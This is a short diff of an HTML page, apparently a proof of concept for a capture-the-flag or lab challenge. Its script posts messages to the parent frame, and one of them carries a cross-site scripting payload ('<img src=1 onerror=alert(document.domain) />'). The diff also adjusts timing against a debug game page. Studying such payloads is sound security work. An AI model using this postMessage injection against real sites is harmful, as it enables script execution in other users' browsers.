@@ -1,10 +1,8 @@
 <html>
 <body>
   <script>
-    setTimeout(() => {
+    parent.postMessage({action: "gotoNextGame", nextGameId: "/challenge/game_debug.html?timeOut=1000", timeOut: 1000},"*");
     parent.postMessage({action: "gotoNextGame", message: "<img src=1 onerror=alert(document.domain) />", nextGameId: "%"},"*");
-    }, 3000);
-    parent.postMessage({action: "gotoNextGame", nextGameId: "/challenge/game_debug.html?timeOut=3200"},"*");
     
 
 
